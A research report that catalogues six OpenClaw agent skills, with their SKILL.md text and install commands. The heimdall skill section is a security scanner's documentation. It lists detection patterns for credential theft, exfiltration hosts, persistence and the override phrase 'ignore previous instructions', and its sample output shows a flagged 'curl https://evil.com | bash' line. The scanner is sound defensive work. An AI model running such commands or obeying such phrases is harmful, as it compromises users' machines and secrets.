# OpenClaw Skills Research Report

**Date:** 2026-02-12  
**Source:** GitHub openclaw/skills repo + ClawHub + awesome-openclaw-skills  

---

## Summary

| # | Skill | Found | Source | Version | Author |
|---|-------|-------|--------|---------|--------|
| 1 | **heimdall** | ✅ YES | openclaw/skills/henrino3/heimdall | v4.0.0 / v1.0.1 | henrino3 (Enterprise Crew) |
| 2 | **cc-godmode** | ✅ YES | openclaw/skills/cubetribe/cc-godmode | v5.11.1 | CC_GodMode Team |
| 3 | **piv** | ✅ YES | openclaw/skills/smokealot420/piv | v1.1.0 | SmokeAlot420 |
| 4 | **tdd-guide** | ✅ YES | openclaw/skills/alirezarezvani/tdd-guide | v0.1.0 | alirezarezvani |
| 5 | **railway-skill** | ✅ YES | leicao-me/railway-skill (GitHub) + openclaw/skills | latest | Lei Cao |
| 6 | **project-context-sync** | ✅ YES | openclaw/skills/joe3112/project-context-sync | v1.0.0 | Joe3112 |

**All 6 skills were found publicly.** Install via: `npx clawhub@latest install <skill-slug>`

---

## 1. heimdall

**Source URL:** https://github.com/openclaw/skills/tree/main/skills/henrino3/heimdall  
**Also listed in:** awesome-openclaw-skills → Security & Passwords  
**External repo:** https://github.com/henrino3/heimdall  
**Description:** Security Scanner for AI Agent Skills — scans for malicious patterns before installation with 100+ detection rules and context-aware false positive reduction (~85%).

### Files in skill folder:
- `SKILL.md` — main skill definition
- `README.md` — detailed documentation
- `skill-scan.py` — standalone scanner script
- `scripts/` — additional scripts (includes `skill-scan.py`)
- `_meta.json`, `skill.json` — metadata

### SKILL.md Content:

```markdown
---
name: heimdall
description: Security scanner for AI agent skills. Scan OpenClaw skills for malicious patterns before installation. Context-aware scanning with AI-powered narrative analysis.
metadata:
  openclaw:
    emoji: "🛡️"
---

# Heimdall - Security Scanner for AI Agent Skills

Scan OpenClaw skills for malicious patterns before installation. Context-aware scanning with AI-powered narrative analysis.

## When to Use

Use Heimdall when:
- Installing a new skill from ClawHub or GitHub
- Reviewing skills before adding to your workspace
- Auditing existing installed skills
- Someone shares a skill URL and you want to verify it's safe

## Commands

### Basic Scan
```bash
~/clawd/skills/heimdall/scripts/skill-scan.py /path/to/skill
```

### AI-Powered Analysis (Recommended)
```bash
~/clawd/skills/heimdall/scripts/skill-scan.py --analyze /path/to/skill
```
Requires `OPENROUTER_API_KEY` env var or `~/clawd/secrets/openrouter.key`

### Scan from URL
```bash
git clone https://github.com/user/skill /tmp/test-skill
~/clawd/skills/heimdall/scripts/skill-scan.py --analyze /tmp/test-skill
rm -rf /tmp/test-skill
```

### Scan All Installed Skills
```bash
for skill in ~/clawd/skills/*/; do
  echo "=== $skill ==="
  ~/clawd/skills/heimdall/scripts/skill-scan.py "$skill"
done
```

## Options

| Flag | Description |
|------|-------------|
| `--analyze` | AI-powered narrative analysis (uses Claude) |
| `--strict` | Ignore context, flag everything |
| `--json` | Output as JSON |
| `-v, --verbose` | Show all findings |
| `--show-suppressed` | Show context-suppressed findings |

## What It Detects (100+ patterns)

### 🚨 Critical
- **credential_access**: .env files, API keys, tokens, private keys
- **network_exfil**: webhook.site, ngrok, requestbin
- **shell_exec**: subprocess, eval, exec, pipe to bash
- **remote_fetch**: curl/wget skill.md from internet
- **heartbeat_injection**: HEARTBEAT.md modifications
- **mcp_abuse**: no_human_approval, auto_approve
- **unicode_injection**: Hidden U+E0001-U+E007F characters

### 🔴 High
- **supply_chain**: External git repos, npm/pip installs
- **telemetry**: OpenTelemetry, Signoz, Uptrace
- **crypto_wallet**: BTC/ETH addresses, seed phrases
- **impersonation**: "ignore previous instructions"
- **privilege**: sudo -S, chmod 777

### ⚠️ Medium
- **prefill_exfil**: Google Forms data exfiltration
- **persistence**: crontab, bashrc modifications

## Example Output

### Basic Scan
```
============================================================
🔍 SKILL SECURITY SCAN REPORT v4.0
============================================================
📁 Path: /tmp/suspicious-skill
📄 Files scanned: 6
🔢 Active issues: 14
⚡ Max severity: CRITICAL
📋 Action: 🚨 CRITICAL - BLOCKED - Likely malicious
============================================================

🚨 CRITICAL (3 issues):
  [shell_exec]
    • install.sh:12 - Pipe to bash
      Match: curl https://evil.com | bash
```

### AI Analysis (--analyze)
```
============================================================
🔍 HEIMDALL SECURITY ANALYSIS 
============================================================

📁 Skill: suspicious-skill
⚡ Verdict: 🚨 HIGH RISK - Requires Significant Trust

## Summary
This skill installs code from an external company that can 
self-modify and sends telemetry to third-party servers.

## Key Risks

### 1. Data Exfiltration
OpenTelemetry sends execution traces to external servers.
YOUR agent's behavior → THEIR servers. 🚨

### 2. Supply Chain Attack Surface
Git clones from external repos during install and self-evolution.

## What You're Agreeing To
1. Installing their code
2. Letting it modify itself
3. Sending telemetry to them

## Recommendation
🔴 Don't install on any machine with real data/keys.
============================================================
```

## Context-Aware Scanning

Heimdall understands context to reduce false positives (~85% reduction):

| Context | Severity Adjustment |
|---------|---------------------|
| CODE | Full severity |
| CONFIG | -1 level |
| DOCS | -3 levels (patterns in README are examples) |
| STRING | -3 levels (blocklist definitions) |

Use `--strict` to disable context adjustment and flag everything.

## Security Sources

Patterns derived from:
- [Simon Willison - Moltbook Security Analysis](https://simonwillison.net/2026/Jan/30/moltbook/)
- [PromptArmor - MCP Tool Attacks](https://promptarmor.com)
- [LLMSecurity.net - Auto-Approve Exploits](https://llmsecurity.net)
- [OWASP - Injection Attacks](https://owasp.org/Top10/)

## Installation Notes

After installing from ClawHub, create an alias for convenience:
```bash
echo 'alias skill-scan="~/clawd/skills/heimdall/scripts/skill-scan.py"' >> ~/.bashrc
source ~/.bashrc
```

For AI analysis, ensure you have an OpenRouter API key:
```bash
# Option 1: Environment variable
export OPENROUTER_API_KEY="sk-or-..."

# Option 2: Save to file
echo "sk-or-..." > ~/clawd/secrets/openrouter.key
```

## Credits

Built by the Enterprise Crew 🚀
- Ada 🔮 (Brain + BD/Sales)
- Spock 🖖 (Research & Ops) 
- Scotty 🔧 (Builder)

GitHub: https://github.com/henrino3/heimdall
```

---

## 2. cc-godmode

**Source URL:** https://github.com/openclaw/skills/tree/main/skills/cubetribe/cc-godmode  
**Listed in:** awesome-openclaw-skills → Coding Agents & IDEs  
**Description:** Self-orchestrating multi-agent development workflows. You say WHAT, the AI decides HOW. 8 specialized sub-agents with dual quality gates.

### SKILL.md Content (711 lines, summarized key sections):

```markdown
---
name: cc-godmode
description: "Self-orchestrating multi-agent development workflows. You say WHAT, the AI decides HOW."
metadata:
  clawdbot:
    emoji: "🚀"
    author: "CC_GodMode Team"
    version: "5.11.1"
    tags:
      - orchestration
      - multi-agent
      - development
      - workflow
      - claude-code
      - automation
    repository: "https://github.com/clawdbot/cc-godmode-skill"
    license: "MIT"
    tools:
      - Read
      - Write
      - Edit
      - Bash
      - Glob
      - Grep
      - WebSearch
      - WebFetch
---

# CC_GodMode 🚀

> **Self-Orchestrating Development Workflows - You say WHAT, the AI decides HOW.**

You are the **Orchestrator** for CC_GodMode - a multi-agent system that automatically
delegates and orchestrates development workflows. You plan, coordinate, and delegate.
You NEVER implement yourself.

## Quick Start

| Command | What happens |
|---------|--------------|
| `New Feature: [X]` | Full workflow: research → design → implement → test → document |
| `Bug Fix: [X]` | Quick fix: implement → validate → test |
| `API Change: [X]` | Safe API change with consumer analysis |
| `Research: [X]` | Investigate technologies/best practices |
| `Process Issue #X` | Load and process a GitHub issue |
| `Prepare Release` | Document and publish release |

## Your Subagents

You have 8 specialized agents. Call them via the Task tool with `subagent_type`:

| Agent | Role | Model | Key Tools |
|-------|------|-------|-----------|
| `@researcher` | Knowledge Discovery | haiku | WebSearch, WebFetch |
| `@architect` | System Design | opus | Read, Grep, Glob |
| `@api-guardian` | API Lifecycle | sonnet | Grep, Bash (git diff) |
| `@builder` | Implementation | sonnet | Read, Write, Edit, Bash |
| `@validator` | Code Quality Gate | sonnet | Bash (tsc, tests) |
| `@tester` | UX Quality Gate | sonnet | Playwright, Lighthouse |
| `@scribe` | Documentation | sonnet | Read, Write, Edit |
| `@github-manager` | GitHub Ops | haiku | GitHub MCP, Bash (gh) |

## Standard Workflows

### 1. New Feature (Full Workflow)
```
                                          ┌──▶ @validator ──┐
User ──▶ (@researcher)* ──▶ @architect ──▶ @builder              ├──▶ @scribe
                                          └──▶ @tester   ──┘
                                               (PARALLEL)
```

### 2. Bug Fix (Quick)
```
                ┌──▶ @validator ──┐
User ──▶ @builder                  ├──▶ (done)
                └──▶ @tester   ──┘
```

### 3. API Change (Critical!)
```
User ──▶ (@researcher)* ──▶ @architect ──▶ @api-guardian ──▶ @builder ──▶ @validator + @tester ──▶ @scribe
```
**@api-guardian is MANDATORY for API changes!**

### 4. Refactoring
```
User ──▶ @architect ──▶ @builder ──▶ @validator + @tester
```

### 5. Release
```
User ──▶ @scribe ──▶ @github-manager
```

### 6. Process Issue
```
User: "Process Issue #X" → @github-manager loads → Orchestrator analyzes → Appropriate workflow
```

### 7. Research Task
```
User: "Research [topic]" → @researcher → Report with findings + sources
```

## The 10 Golden Rules

1. **Version-First** - Determine target version BEFORE any work starts
2. **@researcher for Unknown Tech** - Use when new technologies need evaluation
3. **@architect is the Gate** - No feature starts without architecture decision
4. **@api-guardian is MANDATORY for API changes** - No exceptions
5. **Dual Quality Gates** - @validator (Code) AND @tester (UX) must BOTH be green
6. **@tester MUST create Screenshots** - Every page at 3 viewports
7. **Use Task Tool** - Call agents via Task tool with `subagent_type`
8. **No Skipping** - Every agent in the workflow must be executed
9. **Reports in reports/vX.X.X/** - All agents save reports under version folder
10. **NEVER git push without permission** - Applies to ALL agents!

## Dual Quality Gates

After @builder completes, BOTH gates run in parallel for 40% faster validation.

| @validator | @tester | Action |
|------------|---------|--------|
| ✅ APPROVED | ✅ APPROVED | → @scribe |
| ✅ APPROVED | 🔴 BLOCKED | → @builder (tester concerns) |
| 🔴 BLOCKED | ✅ APPROVED | → @builder (code concerns) |
| 🔴 BLOCKED | 🔴 BLOCKED | → @builder (merged feedback) |

## MCP Servers Used

- `playwright` - REQUIRED for @tester
- `github` - REQUIRED for @github-manager
- `lighthouse` - OPTIONAL for @tester (Performance)
- `a11y` - OPTIONAL for @tester (Accessibility)
- `memory` - OPTIONAL for @researcher, @architect

## Start

When the user makes a request:
1. Analyze the request type (Feature/Bug/API/Refactor/Issue)
2. Determine version → Read VERSION file, decide increment
3. Create report folder → `mkdir -p reports/vX.X.X/`
4. Announce version → "Working on vX.X.X - [description]"
5. Check MCP server availability
6. Select the appropriate workflow
7. Activate agents → All reports saved to `reports/vX.X.X/`
8. Complete → @scribe updates VERSION + CHANGELOG
```

---

## 3. piv

**Source URL:** https://github.com/openclaw/skills/tree/main/skills/smokealot420/piv  
**Listed in:** awesome-openclaw-skills → Coding Agents & IDEs  
**Description:** PIV workflow orchestrator - Plan, Implement, Validate loop for systematic multi-phase software development.

### SKILL.md Content (229 lines):

```markdown
---
name: piv
description: "PIV workflow orchestrator - Plan, Implement, Validate loop for systematic
  multi-phase software development. Use when building features phase-by-phase with PRPs,
  automated validation loops, or multi-agent orchestration. Supports PRD creation, PRP
  generation, codebase analysis, and iterative execution with validation."
user-invocable: true
disable-model-invocation: true
metadata:
  {"openclaw":{"emoji":"gear","homepage":"https://github.com/SmokeAlot420/ftw",
   "requires":{"bins":["git"]},"os":["darwin","linux"]}}
---

# PIV Ralph Orchestrator

## Arguments: $ARGUMENTS

Parse arguments using this logic:

### PRD Path Mode (first argument ends with `.md`)
- `PRD_PATH` - Direct path to the PRD file
- `PROJECT_PATH` - Derived by going up from PRDs/ folder
- `START_PHASE` - Second argument (default: 1)
- `END_PHASE` - Third argument (default: auto-detect from PRD)

### Project Path Mode
- `PROJECT_PATH` - Absolute path to project (default: current working directory)
- `START_PHASE` - Second argument (default: 1)
- `END_PHASE` - Third argument (default: 4)
- `PRD_PATH` - Auto-discover from `PROJECT_PATH/PRDs/` folder

## Required Reading by Role

| Role | Instructions |
|------|-------------|
| PRD Creation | Read {baseDir}/references/create-prd.md |
| PRP Generation | Read {baseDir}/references/generate-prp.md |
| Codebase Analysis | Read {baseDir}/references/codebase-analysis.md |
| Executor | Read {baseDir}/references/piv-executor.md + execute-prp.md |
| Validator | Read {baseDir}/references/piv-validator.md |
| Debugger | Read {baseDir}/references/piv-debugger.md |

**Prerequisite:** A PRD must exist. If none found, tell user to create one first.

## Orchestrator Philosophy

> "Context budget: ~15% orchestrator, 100% fresh per subagent"

You are the orchestrator. You stay lean and manage workflow. You DO NOT execute PRPs
yourself - you spawn specialized sub-agents with fresh context for each task.

**Sub-agent spawning:** Use `sessions_spawn` tool to create fresh sub-agent sessions.

## Project Setup (piv-init)

```bash
mkdir -p PROJECT_PATH/PRDs PROJECT_PATH/PRPs/templates PROJECT_PATH/PRPs/planning
```

## Phase Workflow

For each phase from START_PHASE to END_PHASE:

### Step 1: Check/Generate PRP
- Check for existing PRP, if none exists spawn fresh sub-agent for codebase analysis + PRP generation

### Step 2: Spawn EXECUTOR
- Spawn fresh sub-agent with executor mission

### Step 3: Spawn VALIDATOR
- Spawn fresh sub-agent for verification
- Process result: PASS → commit | GAPS_FOUND → debugger | HUMAN_NEEDED → ask user

### Step 4: Debug Loop (Max 3 iterations)
- Spawn debugger sub-agent, re-validate, loop max 3 or escalate

### Step 5: Smart Commit
- Semantic commit with FTW branding

### Step 6: Update WORKFLOW.md
- Mark phase complete

### Step 7: Next Phase
- Loop back to Step 1

## Error Handling

- No PRD: Tell user to create one first
- Executor BLOCKED: Ask user for guidance
- Validator HUMAN_NEEDED: Ask user for guidance
- 3 debug cycles exhausted: Escalate to user

## Completion

```
## PIV RALPH COMPLETE
Phases Completed: START to END
Total Commits: N
Validation Cycles: M
```
```

---

## 4. tdd-guide

**Source URL:** https://github.com/openclaw/skills/tree/main/skills/alirezarezvani/tdd-guide  
**Listed in:** awesome-openclaw-skills → Coding Agents & IDEs  
**Description:** Test-driven development workflow with test generation, coverage analysis, and multi-framework support.

### SKILL.md Content (118 lines):

```markdown
---
name: tdd-guide
description: Test-driven development workflow with test generation, coverage analysis,
  and multi-framework support
triggers:
  - generate tests
  - analyze coverage
  - TDD workflow
  - red green refactor
  - Jest tests
  - Pytest tests
  - JUnit tests
  - coverage report
---

# TDD Guide

Test-driven development skill for generating tests, analyzing coverage, and guiding
red-green-refactor workflows across Jest, Pytest, JUnit, and Vitest.

## Table of Contents

- [Capabilities](#capabilities)
- [Workflows](#workflows)
- [Tools](#tools)
- [Input Requirements](#input-requirements)
- [Limitations](#limitations)

## Capabilities

| Capability | Description |
|------------|-------------|
| Test Generation | Convert requirements or code into test cases with proper structure |
| Coverage Analysis | Parse LCOV/JSON/XML reports, identify gaps, prioritize fixes |
| TDD Workflow | Guide red-green-refactor cycles with validation |
| Framework Adapters | Generate tests for Jest, Pytest, JUnit, Vitest, Mocha |
| Quality Scoring | Assess test isolation, assertions, naming, detect test smells |
| Fixture Generation | Create realistic test data, mocks, and factories |

## Workflows

### Generate Tests from Code

1. Provide source code (TypeScript, JavaScript, Python, Java)
2. Specify target framework (Jest, Pytest, JUnit, Vitest)
3. Run `test_generator.py` with requirements
4. Review generated test stubs
5. **Validation:** Tests compile and cover happy path, error cases, edge cases

### Analyze Coverage Gaps

1. Generate coverage report from test runner (`npm test -- --coverage`)
2. Run `coverage_analyzer.py` on LCOV/JSON/XML report
3. Review prioritized gaps (P0/P1/P2)
4. Generate missing tests for uncovered paths
5. **Validation:** Coverage meets target threshold (typically 80%+)

### TDD New Feature

1. Write failing test first (RED)
2. Run `tdd_workflow.py --phase red` to validate
3. Implement minimal code to pass (GREEN)
4. Run `tdd_workflow.py --phase green` to validate
5. Refactor while keeping tests green (REFACTOR)
6. **Validation:** All tests pass after each cycle

## Tools

| Tool | Purpose | Usage |
|------|---------|-------|
| `test_generator.py` | Generate test cases | `python scripts/test_generator.py --input source.py --framework pytest` |
| `coverage_analyzer.py` | Parse coverage reports | `python scripts/coverage_analyzer.py --report lcov.info --threshold 80` |
| `tdd_workflow.py` | Guide red-green-refactor | `python scripts/tdd_workflow.py --phase red --test test_auth.py` |
| `framework_adapter.py` | Convert between frameworks | `python scripts/framework_adapter.py --from jest --to pytest` |
| `fixture_generator.py` | Generate test data/mocks | `python scripts/fixture_generator.py --entity User --count 5` |
| `metrics_calculator.py` | Calculate quality metrics | `python scripts/metrics_calculator.py --tests tests/` |
| `format_detector.py` | Detect language/framework | `python scripts/format_detector.py --file source.ts` |
| `output_formatter.py` | Format output | `python scripts/output_formatter.py --format markdown` |

## Input Requirements

**For Test Generation:**
- Source code (file path or pasted content)
- Target framework (Jest, Pytest, JUnit, Vitest)
- Coverage scope (unit, integration, edge cases)

**For Coverage Analysis:**
- Coverage report file (LCOV, JSON, or XML format)
- Optional: Source code for context
- Optional: Target threshold percentage

**For TDD Workflow:**
- Feature requirements or user story
- Current phase (RED, GREEN, REFACTOR)
- Test code and implementation status

## Limitations

| Scope | Details |
|-------|---------|
| Unit test focus | Integration and E2E tests require different patterns |
| Static analysis | Cannot execute tests or measure runtime behavior |
| Language support | Best for TypeScript, JavaScript, Python, Java |
| Report formats | LCOV, JSON, XML only; other formats need conversion |
| Generated tests | Provide scaffolding; require human review for complex logic |

**When to use other tools:**
- E2E testing: Playwright, Cypress, Selenium
- Performance testing: k6, JMeter, Locust
- Security testing: OWASP ZAP, Burp Suite
```

---

## 5. railway-skill

**Source URL (external):** https://github.com/leicao-me/railway-skill  
**Source URL (official):** https://github.com/openclaw/skills/tree/main/skills/leicao-me/railway-skill  
**Description:** Deploy and manage applications on Railway.app with zero-config. CLI wrapper + comprehensive Railway reference.

### SKILL.md Content (328 lines):

```markdown
---
name: railway
description: Deploy and manage applications on Railway.app. Use for deploying projects,
  managing services, viewing logs, setting environment variables, and managing databases.
  Railway is a modern cloud platform for deploying apps with zero configuration.
metadata:
  {
    "openclaw":
      {
        "emoji": "🚂",
        "requires": { "bins": ["railway"] },
        "install":
          [
            {
              "id": "brew",
              "kind": "brew",
              "formula": "railway",
              "bins": ["railway"],
              "label": "Install Railway CLI (brew)",
            },
            {
              "id": "npm",
              "kind": "npm",
              "package": "@railway/cli",
              "bins": ["railway"],
              "label": "Install Railway CLI (npm)",
            },
          ],
      },
  }
---

# Railway

Deploy and manage applications on [Railway.app](https://railway.app) - a modern
cloud platform with zero-config deployments.

## Authentication

```bash
railway login            # Opens browser
railway login --token <TOKEN>  # CI/CD
railway whoami           # Check login status
railway logout
```

## Project Management

### Link & Initialize
```bash
railway link
railway link --project <PROJECT_ID>
railway init
railway unlink
```

### View Projects
```bash
railway list
railway open
railway status
```

## Deployment

```bash
railway up                           # Deploy current directory
railway up --detach                  # Deploy without watching logs
railway up --service <SERVICE_NAME>  # Deploy specific service
railway up --environment production  # Deploy to specific environment
railway redeploy                     # Redeploy latest version
```

## Services

```bash
railway service
railway service create
railway service delete <SERVICE_NAME>
```

## Environment Variables

```bash
railway variables
railway variables set KEY=value
railway variables set KEY1=value1 KEY2=value2
railway variables delete KEY
railway variables get KEY
```

## Logs

```bash
railway logs
railway logs --service <SERVICE_NAME>
railway logs --no-follow
railway logs --timestamps
```

## Run Commands

```bash
railway run <command>
railway run npm start
railway run python manage.py migrate
railway ssh
railway ssh --service <SERVICE_NAME>
```

## Domains

```bash
railway domain
railway domain add <DOMAIN>
railway domain delete <DOMAIN>
```

## Databases

```bash
railway add --plugin postgresql
railway add --plugin mysql
railway add --plugin redis
railway add --plugin mongodb
```

## Environments

```bash
railway environment
railway environment <ENV_NAME>
railway environment create <ENV_NAME>
railway environment delete <ENV_NAME>
```

## Volumes

```bash
railway volume
railway volume create --mount /data
railway volume delete <VOLUME_ID>
```

## Common Workflows

### Deploy a New Project
```bash
cd my-app
railway init
railway add --plugin postgresql
railway variables set NODE_ENV=production
railway up
```

### Connect to Production Database
```bash
railway run psql $DATABASE_URL
```

### CI/CD Integration
```yaml
name: Deploy to Railway
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm i -g @railway/cli
      - run: railway up --detach
        env:
          RAILWAY_TOKEN: ${{ secrets.RAILWAY_TOKEN }}
```

## Resources

- [Railway Documentation](https://docs.railway.com)
- [Railway CLI Reference](https://docs.railway.com/reference/cli-api)
- [Railway Templates](https://railway.app/templates)
- [Railway GitHub](https://github.com/railwayapp/cli)
```

### Additional file: `scripts/rw` (helper CLI)

The skill also includes a bash helper script `rw` with shortcuts:

| Command | Description |
|---------|-------------|
| `rw status` | Show project status |
| `rw up` | Deploy current directory |
| `rw logs` | View logs (live) |
| `rw vars` | List environment variables |
| `rw set K=V` | Set environment variable |
| `rw run <cmd>` | Run command with Railway env |
| `rw ssh` | SSH into running service |
| `rw db <type>` | Add database (postgres, mysql, redis, mongo) |

---

## 6. project-context-sync

**Source URL:** https://github.com/openclaw/skills/tree/main/skills/joe3112/project-context-sync  
**Listed in:** awesome-openclaw-skills → Git & GitHub  
**External repo:** https://github.com/Joe3112/project-context-sync  
**Description:** Keep a living project state document updated after each commit, so any agent can instantly understand where things stand.

### SKILL.md Content (145 lines):

```markdown
---
name: project-context-sync
description: Keep a living project state document updated after each commit, so any
  agent (or future session) can instantly understand where things stand.
---

# project-context-sync

Keep a living project state document updated after each commit, so any agent (or
future session) can instantly understand where things stand.

## What It Does

```
┌─────────────┐     ┌──────────────────┐     ┌─────────────────────┐
│ Git Commit  │ ──▶ │ Post-commit Hook │ ──▶ │ PROJECT_STATE.md    │
│             │     │                  │     │ (auto-updated)      │
└─────────────┘     └──────────────────┘     └─────────────────────┘
```

After each commit, the hook:
1. Gathers git info (last commit, recent history, branch, changed files)
2. Optionally calls an LLM to generate a smart summary
3. Updates `PROJECT_STATE.md` in the repo root

## Installation

```bash
cd /path/to/your/repo
/path/to/skills/project-context-sync/scripts/install.sh
```

Or if you have the skill in your path:
```bash
project-context-sync install
```

This will:
1. Install a post-commit hook in `.git/hooks/`
2. Create `.project-context.yml` with default config
3. Create initial `PROJECT_STATE.md`
4. Add `PROJECT_STATE.md` to `.gitignore`

## Uninstall

```bash
cd /path/to/your/repo
/path/to/skills/project-context-sync/scripts/uninstall.sh
```

## Manual Update

Trigger an update without committing:
```bash
cd /path/to/your/repo
/path/to/skills/project-context-sync/scripts/update-context.sh
```

## Configuration

Edit `.project-context.yml` in your repo root:

```yaml
project_context:
  # Use AI to generate smart summaries (default: true)
  ai_summary: true
  
  # How many recent commits to include
  recent_commits: 5
  
  # Include diff stats in context
  include_diff_stats: true
  
  # Sections to include
  sections:
    - last_commit
    - recent_changes
    - current_focus    # AI-generated
    - suggested_next   # AI-generated
```

### AI Summary Mode

**With `ai_summary: true`** (default):
- Generates intelligent summaries of what changed
- Infers current focus from recent commit patterns
- Suggests next steps
- Costs tokens but provides rich context
- **Requires:** Gateway HTTP API enabled

**With `ai_summary: false`**:
- Just logs raw git info
- Fast and free
- Less intelligent but still useful

### Enabling the Gateway HTTP API

AI mode uses Clawdbot's OpenAI-compatible endpoint (`/v1/chat/completions`).

```json5
// ~/.clawdbot/clawdbot.json
{
  "gateway": {
    "http": {
      "endpoints": {
        "chatCompletions": { "enabled": true }
      }
    }
  }
}
```

## Output

`PROJECT_STATE.md` will contain:

```markdown
# Project State
*Auto-updated by project-context-sync*

## Last Commit
- **Hash:** abc123
- **Message:** Implement isPro check for app blocking
- **Branch:** feature/subscription-gating
- **When:** 2026-01-29 12:34
- **Files changed:** 3

## Recent Changes
- abc123: Implement isPro check for app blocking
- def456: Add PaywallPrompt component

## Current Focus
[AI-generated summary of what's being worked on]

## Suggested Next Steps
[AI-suggested based on commit patterns]
```

## Notes

- `PROJECT_STATE.md` is gitignored by default (regenerated locally)
- The hook requires Clawdbot to be running for AI summaries
- Without Clawdbot, falls back to raw git info mode
```

### Additional files:
- `scripts/install.sh` — installs post-commit hook
- `scripts/uninstall.sh` — removes the hook
- `scripts/update-context.sh` — manual trigger

---

## Installation Commands

```bash
# Install all 6 via ClawHub CLI:
npx clawhub@latest install henrino3/heimdall
npx clawhub@latest install cubetribe/cc-godmode
npx clawhub@latest install smokealot420/piv
npx clawhub@latest install alirezarezvani/tdd-guide
npx clawhub@latest install leicao-me/railway
npx clawhub@latest install joe3112/project-context-sync

# Or manual install (clone to skills directory):
# Global: ~/.openclaw/skills/
# Workspace: <project>/skills/
```
